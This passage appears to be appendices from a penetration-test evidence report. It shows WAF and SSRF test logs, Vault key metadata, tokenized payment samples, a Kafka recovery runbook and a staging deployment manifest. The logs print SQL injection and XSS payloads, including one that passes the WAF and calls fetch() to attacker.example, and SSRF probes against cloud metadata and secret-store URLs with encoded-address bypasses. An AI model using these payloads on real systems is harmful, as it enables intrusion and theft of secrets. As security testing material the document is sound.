+  Path: /api/v2/products/search?q=' OR 1=1--
+  Action: DENY
+  Response: 403 Forbidden
+  Body: {"error":"Request blocked by WAF","rule":"vc-waf-sql-001"}
+
+[2025-09-04 14:02:18.102 UTC] WAF EVENT
+  Decision: BLOCK
+  Rule ID: vc-waf-sql-002
+  Rule Name: SQL Injection — UNION SELECT
+  Source IP: 10.42.16.52 (ironclad-scan-02)
+  Method: GET
+  Path: /api/v2/products/search?q=1 UNION SELECT username,password FROM users--
+  Action: DENY
+  Response: 403 Forbidden
+
+[2025-09-04 14:02:19.203 UTC] WAF EVENT
+  Decision: BLOCK
+  Rule ID: vc-waf-xss-001
+  Rule Name: XSS Pattern — Script Tag
+  Source IP: 10.42.16.52 (ironclad-scan-02)
+  Method: POST
+  Path: /api/v2/checkout/apply-coupon
+  Body: {"coupon_code":"<script>alert(1)</script>"}
+  Action: DENY
+  Response: 403 Forbidden
+
+[2025-09-04 14:02:20.104 UTC] WAF EVENT
+  Decision: BLOCK
+  Rule ID: vc-waf-xss-003
+  Rule Name: XSS Pattern — IMG Event Handler
+  Source IP: 10.42.16.52 (ironclad-scan-02)
+  Method: POST
+  Path: /api/v2/checkout/apply-coupon
+  Body: {"coupon_code":"<img src=x onerror=alert(1)>"}
+  Action: DENY
+  Response: 403 Forbidden
+
+[2025-09-04 14:02:21.005 UTC] WAF EVENT
+  Decision: PASS
+  Source IP: 10.42.16.52 (ironclad-scan-02)
+  Method: POST
+  Path: /api/v2/checkout/apply-coupon
+  Body: {"coupon_code":"<svg onload=alert(1)>"}
+  WAF Analysis: No matching rule for SVG element with event handler
+  Action: PASS
+  Application Response: 200 OK
+  Note: SVG event handler not covered by WAF rule set — finding VC-PT-041
+
+[2025-09-04 14:02:22.107 UTC] WAF EVENT
+  Decision: PASS
+  Source IP: 10.42.16.52 (ironclad-scan-02)
+  Method: POST
+  Path: /api/v2/checkout/apply-coupon
+  Body: {"coupon_code":"<svg/onload=fetch('https://attacker.example/')>"}
+  WAF Analysis: No matching rule
+  Action: PASS
+  Application Response: 200 OK
+
+--- SSRF Test Probes (All Blocked) ---
+
+[2025-09-06 11:30:01.401 UTC] REQUEST
+  Method: POST
+  Path: /api/v2/products/import
+  Source IP: 10.42.16.51 (ironclad-scan-01)
+  Body: {"source_url":"http://169.254.169.254/latest/meta-data/"}
+  X-Request-ID: pt-req-2025-09-06-04501
+
+[2025-09-06 11:30:01.412 UTC] RESPONSE
+  Status: 403 Forbidden
+  Body: {"error":"URL scheme not allowed","code":"SSRF_BLOCKED"}
+  X-Response-Time: 11ms
+
+[2025-09-06 11:30:02.503 UTC] REQUEST
+  Method: POST
+  Path: /api/v2/products/import
+  Source IP: 10.42.16.51 (ironclad-scan-01)
+  Body: {"source_url":"http://10.42.20.1:8200/v1/secret/data/payment-keys"}
+  X-Request-ID: pt-req-2025-09-06-04502
+
+[2025-09-06 11:30:02.515 UTC] RESPONSE
+  Status: 403 Forbidden
+  Body: {"error":"Internal network address blocked","code":"SSRF_BLOCKED"}
+  X-Response-Time: 12ms
+
+[2025-09-06 11:30:03.601 UTC] REQUEST
+  Method: POST
+  Path: /api/v2/products/import
+  Source IP: 10.42.16.51 (ironclad-scan-01)
+  Body: {"source_url":"http://[::ffff:169.254.169.254]/latest/meta-data/"}
+  X-Request-ID: pt-req-2025-09-06-04503
+
+[2025-09-06 11:30:03.613 UTC] RESPONSE
+  Status: 403 Forbidden
+  Body: {"error":"URL scheme not allowed","code":"SSRF_BLOCKED"}
+  X-Response-Time: 12ms
+
+[2025-09-06 11:30:04.702 UTC] REQUEST
+  Method: POST
+  Path: /api/v2/products/import
+  Source IP: 10.42.16.51 (ironclad-scan-01)
+  Body: {"source_url":"http://0x7f000001:8200/v1/secret/data/keys"}
+  X-Request-ID: pt-req-2025-09-06-04504
+
+[2025-09-06 11:30:04.714 UTC] RESPONSE
+  Status: 403 Forbidden
+  Body: {"error":"Internal network address blocked","code":"SSRF_BLOCKED"}
+
+────────────────────────────────────────────────────────────────────────────────
+APPENDIX B: Vault KMS Encryption Key Metadata
+────────────────────────────────────────────────────────────────────────────────
+
+Cluster: vault-kms-prod
+  Version: HashiCorp Vault 1.15.4
+  Storage backend: Integrated Raft
+  Nodes: 5 (3 active voters, 2 standby non-voters)
+  Seal type: AWS KMS auto-unseal
+  Cluster address: https://vault.internal.vantage.com:8201
+  API address: https://vault.internal.vantage.com:8200
+
+Active encryption keys:
+
+  Key: cde-data-encryption-key
+    Algorithm: AES-256-GCM
+    Key version: 14
+    Created: 2025-08-28 03:00:00 UTC
+    Rotation schedule: 90-day automatic
+    Next rotation: 2025-11-26
+    Previous versions: retained for decryption (365-day retention)
+    Access policy: cde-encryption-readers (12 service accounts)
+    Last access: 2025-09-10 02:14 UTC (payment-gateway-prod)
+
+  Key: tokenization-master-key
+    Algorithm: AES-256-GCM
+    Key version: 14
+    Created: 2025-08-28 03:00:02 UTC
+    Rotation schedule: 90-day automatic
+    Next rotation: 2025-11-26
+    Access policy: tokenization-service-only (1 service account: svc-tokenization-prod)
+    Last access: 2025-09-10 02:14 UTC (tokenization-service-prod)
+
+  Key: audit-log-signing-key
+    Algorithm: ECDSA P-256
+    Key version: 4
+    Created: 2025-07-01 00:00:00 UTC
+    Rotation schedule: 180-day manual
+    Next rotation: 2025-12-28
+    Purpose: Signing hourly log segment hashes for tamper detection
+    Access policy: audit-log-signer (2 service accounts: splunk-forwarder-prod, log-integrity-checker)
+
+Secret access audit (September 1-10):
+  Total secret reads: 948
+  Top consumers:
+    1. payment-gateway-prod: 412 reads (43.5%)
+    2. tokenization-service-prod: 298 reads (31.4%)
+    3. deploy-pipeline-prod: 187 reads (19.7%)
+    4. batch-payment-reconciler: 51 reads (5.4%)
+  Unauthorized access attempts: 0
+  Policy violations: 0
+
+────────────────────────────────────────────────────────────────────────────────
+APPENDIX C: Tokenization-Service Sample Records
+────────────────────────────────────────────────────────────────────────────────
+
+Database: payment-db-primary
+Table: transactions
+Query: SELECT transaction_id, payment_token, last_four, card_brand, amount, currency, status, created_at FROM transactions WHERE created_at >= '2025-09-08' ORDER BY created_at DESC LIMIT 10;
+
+Record 1:
+  transaction_id: txn-2025-09-08-00001472
+  payment_token: vc_tok_a3f8b2c1-7d4e-4f91-b6a2-8c3d5e7f9012
+  last_four: 4242
+  card_brand: Visa
+  amount: 89.99
+  currency: USD
+  status: settled
+  created_at: 2025-09-08T14:22:31Z
+
+Record 2:
+  transaction_id: txn-2025-09-08-00001473
+  payment_token: vc_tok_b4c9d3e2-8f5a-4e82-c7b3-9d4e6f8a0123
+  last_four: 1881
+  card_brand: Mastercard
+  amount: 234.50
+  currency: USD
+  status: settled
+  created_at: 2025-09-08T14:22:33Z
+
+Record 3:
+  transaction_id: txn-2025-09-08-00001474
+  payment_token: vc_tok_c5d0e4f3-9a6b-4d73-d8c4-0e5f7a9b1234
+  last_four: 3456
+  card_brand: Amex
+  amount: 512.00
+  currency: USD
+  status: pending
+  created_at: 2025-09-08T14:22:35Z
+
+Record 4:
+  transaction_id: txn-2025-09-08-00001475
+  payment_token: vc_tok_d6e1f5a4-0b7c-4e84-e9d5-1f6a8b0c2345
+  last_four: 7890
+  card_brand: Visa
+  amount: 45.00
+  currency: USD
+  status: settled
+  created_at: 2025-09-08T14:22:37Z
+
+Record 5:
+  transaction_id: txn-2025-09-08-00001476
+  payment_token: vc_tok_e7f2a6b5-1c8d-4f95-f0e6-2a7b9c1d3456
+  last_four: 5555
+  card_brand: Mastercard
+  amount: 178.25
+  currency: USD
+  status: settled
+  created_at: 2025-09-08T14:22:39Z
+
+Verification: All 5 records contain tokenized payment references only. Zero instances of full PAN in any column. Token format consistent: vc_tok_{uuid_v4}.
+
+────────────────────────────────────────────────────────────────────────────────
+APPENDIX D: Runbook — Kafka Audit Log Connector Recovery
+────────────────────────────────────────────────────────────────────────────────
+
+Runbook: RB-TOK-003 — Tokenization Audit Log Kafka Connector Recovery
+Author: Anika Patel
+Created: 2025-09-10
+Last Updated: 2025-09-10
+Trigger: Kafka Connect tokenization-audit-sink connector enters FAILED state
+
+Symptoms:
+  - Audit log records stop appearing in Splunk for tokenization-service events
+  - Kafka Connect status API shows connector status: FAILED
+  - No auto-recovery after 30 minutes
+
+Diagnosis:
+  Step 1: Check connector status
+    curl -s http://kafka-connect-prod:8083/connectors/tokenization-audit-sink/status | jq .
+    Expected output when failed:
+    {
+      "name": "tokenization-audit-sink",
+      "connector": {"state": "RUNNING", "worker_id": "kafka-connect-prod-01:8083"},
+      "tasks": [
+        {"id": 0, "state": "FAILED", "trace": "java.lang.OutOfMemoryError: Java heap space..."}
+      ]
+    }
+
+  Step 2: Check Kafka Connect worker memory
+    kubectl -n kafka exec kafka-connect-prod-01 -- jstat -gcutil 1 5
+    If Old Gen > 95%, OOM is confirmed.
+
+  Step 3: Check topic lag
+    kafka-consumer-groups.sh --bootstrap-server kafka-prod:9092 --group tokenization-audit-sink --describe
+    Note the LAG column — this is the number of records to backfill.
+
+Recovery:
+  Step 4: Restart the failed task
+    curl -X POST http://kafka-connect-prod:8083/connectors/tokenization-audit-sink/tasks/0/restart
+
+  Step 5: If restart fails, restart the entire connector
+    curl -X POST http://kafka-connect-prod:8083/connectors/tokenization-audit-sink/restart
+
+  Step 6: Verify recovery
+    Watch Splunk for new tokenization audit events within 5 minutes.
+    Re-run consumer group lag check — lag should be decreasing.
+
+  Step 7: Backfill if gap exceeds 24 hours
+    Run backfill script: python3 /opt/scripts/backfill_audit_logs.py --topic tokenization-audit --start-time <gap_start> --end-time <gap_end>
+    Script reads from Kafka topic (7-day retention) and replays to Splunk HEC endpoint.
+    Reconciliation: compare record count in Kafka vs Splunk for the gap period.
+
+Escalation:
+  If connector cannot be recovered within 1 hour, page on-call SRE (PagerDuty service: kafka-infrastructure).
+  If Kafka topic retention has expired (>7 days), audit records may be unrecoverable — escalate to Lena Vasquez (Internal Audit) for PCI evidence gap documentation.
+
+Reference: Aug 12-14 2025 incident — connector OOM, 47,231 records backfilled successfully after manual restart on Aug 14 and backfill on Aug 15.
+
+────────────────────────────────────────────────────────────────────────────────
+APPENDIX E: Deploy Manifest — staging-pentest Environment Configuration
+────────────────────────────────────────────────────────────────────────────────
+
+# staging-pentest-checkout.yaml
+# Deployed for Ironclad pentest engagement ISP-VC-2025-Q3-0042
+# Created: 2025-08-30
+# Owner: Marcus Tran (security)
+
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: checkout-service
+  namespace: staging-pentest
+  labels:
+    app: checkout-service
+    version: v2.18.3
+    environment: staging-pentest
+    engagement: ISP-VC-2025-Q3-0042
+    managed-by: security-team
+  annotations:
+    deployment.kubernetes.io/revision: "1"
+    pentest.vantage.com/engagement-id: "ISP-VC-2025-Q3-0042"
+    pentest.vantage.com/lead-tester: "Dara Okonkwo"
+    pentest.vantage.com/test-window-start: "2025-09-01"
+    pentest.vantage.com/test-window-end: "2025-09-08"
+spec:
+  replicas: 3
+  selector:
+    matchLabels:
+      app: checkout-service
+  template:
+    metadata:
+      labels:
+        app: checkout-service
+        version: v2.18.3
+    spec:
+      serviceAccountName: checkout-service-sa
+      containers:
+        - name: checkout-service
+          image: vcr.io/checkout-service:v2.18.3-staging-pentest
+          ports:
+            - containerPort: 8080
+              name: http
+              protocol: TCP
+            - containerPort: 9090
+              name: metrics
+              protocol: TCP
+          resources:
+            requests:
+              cpu: "500m"
+              memory: "512Mi"
+            limits:
+              cpu: "2000m"
+              memory: "2Gi"
+          env:
+            - name: NODE_ENV
+              value: "staging"
+            - name: ENABLE_STACK_TRACE
+              value: "true"
+            - name: WAF_RULE_SET
+              value: "vc-waf-prod-2025q2"
+            - name: LOG_LEVEL
+              value: "debug"
+            - name: PAYMENT_GATEWAY_URL
+              value: "http://payment-gateway.staging-pentest.svc.cluster.local:8080"
+            - name: ORDER_MGMT_URL
+              value: "http://order-management-service.staging-pentest.svc.cluster.local:8080"
+            - name: REDIS_URL
+              value: "redis://redis-staging-pentest.staging-pentest.svc.cluster.local:6379"
+            - name: DB_HOST
+              value: "checkout-db-staging-pentest.internal"
+            - name: DB_PORT
+              value: "5432"
+            - name: DB_NAME
+              value: "checkout_staging_pentest"
+            - name: VAULT_ADDR
+              value: "https://vault-staging.internal.vantage.com:8200"
+            - name: VAULT_ROLE
+              value: "checkout-service-staging-pentest"
+          readinessProbe:
+            httpGet:
+              path: /healthz
+              port: 8080
+            initialDelaySeconds: 10
+            periodSeconds: 5
+          livenessProbe:
+            httpGet:
+              path: /healthz
+              port: 8080
+            initialDelaySeconds: 30
+            periodSeconds: 10
+          volumeMounts:
+            - name: tls-certs
+              mountPath: /etc/tls
+              readOnly: true
+      volumes:
+        - name: tls-certs
+          secret:
+            secretName: checkout-service-tls-staging-pentest
+      nodeSelector:
+        node-pool: staging-pentest
+      tolerations:
+        - key: "pentest"
+          operator: "Equal"
+          value: "true"
+          effect: "NoSchedule"
+
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: checkout-service
+  namespace: staging-pentest
+spec:
+  selector:
+    app: checkout-service
+  ports:
+    - name: http
+      port: 8080
+      targetPort: 8080
+      protocol: TCP
+    - name: metrics
+      port: 9090
+      targetPort: 9090
+      protocol: TCP
+  type: ClusterIP
+
+---
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: checkout-service-netpol
+  namespace: staging-pentest
+spec:
+  podSelector:
+    matchLabels:
+      app: checkout-service
+  policyTypes:
+    - Ingress
+    - Egress
+  ingress:
+    - from:
+        - namespaceSelector:
+            matchLabels:
+              name: staging-pentest
+        - ipBlock:
+            cidr: 10.42.16.0/24
+      ports:
+        - protocol: TCP
+          port: 8080
+  egress:
+    - to:
+        - namespaceSelector:
+            matchLabels:
+              name: staging-pentest
+      ports:
+        - protocol: TCP
+          port: 8080
+        - protocol: TCP
+          port: 5432
+        - protocol: TCP
+          port: 6379
+
+# Deployment verification checklist (post-engagement cleanup 2025-09-09):
+# 1. kubectl delete namespace staging-pentest → namespace deleted
+# 2. kubectl get all -n staging-pentest → "No resources found in staging-pentest namespace."
+# 3. AWS NLB staging-pentest-nlb decommissioned and confirmed deleted in us-east-1
+# 4. DNS records *.staging-pentest.vc-internal.net removed from Route53
+# 5. Pentest credential pentest-svc-account-q3 revoked in Okta at 09:14 UTC
+# 6. Authentication attempt at 09:16 UTC confirmed HTTP 401 Unauthorized
+# 7. PCAP archive ISP-VC-2025-Q3-0042-pcap (47.2 GB) uploaded to audit vault S3 bucket
+# 8. All staging-pentest CloudWatch log groups archived and deleted
+# 9. Security group sg-staging-pentest-0042 deleted from VPC
+# 10. Marcus Tran signed off on cleanup completion at 09:45 UTC 2025-09-09
+#
+# This manifest retained in version control for audit reference only.
+# Branch: pentest/ISP-VC-2025-Q3-0042
+# Commit: 4a8f2b3c (tag: pentest-q3-2025-cleanup)
+
+================================================================================
+END OF DOCUMENT — 2025-09-10
+================================================================================
